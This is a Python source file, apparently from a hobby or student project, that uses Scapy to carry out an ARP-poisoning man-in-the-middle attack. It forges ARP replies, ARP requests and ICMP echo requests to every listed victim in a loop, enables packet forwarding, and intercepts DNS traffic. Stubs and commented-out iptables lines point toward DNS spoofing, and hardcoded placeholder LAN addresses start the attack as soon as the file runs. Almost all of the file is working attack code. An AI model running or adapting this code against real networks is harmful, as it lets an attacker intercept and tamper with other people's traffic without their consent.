from scapy.all import *
from Forward import *
from DNS import *
import threading
from config import config

# Forges an ICMP echo request, used for Solaris systems
# Creates an ARP entry for the [src_ip] on the destination device
def forge_icmp_echo_request(src_ip, dst_ip, dst_mac):
	return Ether(dst=dst_mac) / IP(src=src_ip, dst=dst_ip) / ICMP(type="echo-request")

# Forges an ARP reply
def forge_arp_reply(src_ip, src_mac, dst_ip, dst_mac):
	return Ether(dst=dst_mac) / ARP(
		op=2,
		psrc=src_ip,
		pdst=dst_ip,
		hwsrc=src_mac,
		hwdst=dst_mac
	)

# Forges an ARP request, used for linux kernel 2.4.x
# Sends a spoofed ARP request to create an entry in the cache
def forge_arp_request(src_ip, src_mac, dst_ip, dst_mac):
	return Ether(dst=dst_mac) / ARP(
		op=1,
		psrc=src_ip,
		pdst=dst_ip,
		hwsrc=src_mac,
    	hwdst="00:00:00:00:00:00"
	)
	
def poison_loop(forged_icmp_echo_requests, forged_replies, forged_requests, interface):
	i = 1
	# Repeatedly sends each forged response at once and then sleeps for [interval] seconds
	while True:
		# Send packets based on the config settings
		if (config.arp_poison_icmp):
			sendp(forged_icmp_echo_requests, iface=interface)
		if (config.arp_poison_reply):
			sendp(forged_replies, iface=interface)
		if (config.arp_poison_request):
			sendp(forged_requests, iface=interface)

		# For the first 5 poison batches use the warm up delay
		if i < 5:
			time.sleep(config.arp_poison_warm_up)
		else:
			time.sleep(config.arp_poison_delay)
		i += 1
	
def start_arp_mitm(victims, self_mac, interface):
	# create a list of each forged response,
	# so each victim gets all other victims spoofed with the mac of this device
	forged_icmp_echo_requests = [
		forge_icmp_echo_request(ip1, ip2, mac2)
		for (ip1, mac1) in victims
		for (ip2, mac2) in victims
		if (ip1, mac1) != (ip2, mac2)
	]

	forged_replies = [
		forge_arp_reply(ip1, self_mac, ip2, mac2)
		for (ip1, mac1) in victims
		for (ip2, mac2) in victims
		if (ip1, mac1) != (ip2, mac2)
	]

	forged_requests = [
		forge_arp_request(ip1, self_mac, ip2, mac2)
		for (ip1, mac1) in victims
		for (ip2, mac2) in victims
		if (ip1, mac1) != (ip2, mac2)
	]

	thread = threading.Thread(target=poison_loop, args=(forged_icmp_echo_requests, forged_replies, forged_requests, interface), daemon=True)

	thread.start()

	return thread

	# todo find good timings for sending poison/stealth mode(?) (base on OS?)

    
def stop_arp_mitm(thread):
	thread._delete()
	
def only_dns(pkt):
	return pkt.haslayer(DNS)

def print_fn(pkt, ips, interface):
	print(f"src: {pkt[Ether].src}")
	print(f"summary: {pkt.summary()}")
	# spoof_dns(pkt, victim_ip, router_ip, interface)
	
def start_attack(victims, self_ip, self_mac, interface):
	enable_kernel_forwarding(interface)

	thread = start_arp_mitm(victims, self_mac, interface)
		
	# Temp: make this function later	
	# run("iptables -I FORWARD -p udp --dport 53 -j DROP")
	# run("iptables -I FORWARD -p tcp --dport 53 -j DROP")
		
	intercept_pkts(victims, self_mac, interface, only_dns, print_fn)

	input("\nstop")

	stop_arp_mitm(thread)
	cleanup_forward(interface)

# placeholder
victim_ip = "192.168.1.101"
victim_mac = "00:0c:29:d8:3b:bf"
router_ip = "192.168.1.1"
router_mac = "00:0c:29:87:40:17"
self_ip = "192.168.1.100"
self_mac = "00:0c:29:ef:9c:1d"
interface = "eth0"
victims = [(victim_ip, victim_mac), (router_ip, router_mac)]

# start the attack with the placeholder values to avoid having to go through discovery every time for testing
start_attack(victims, self_ip, self_mac, interface)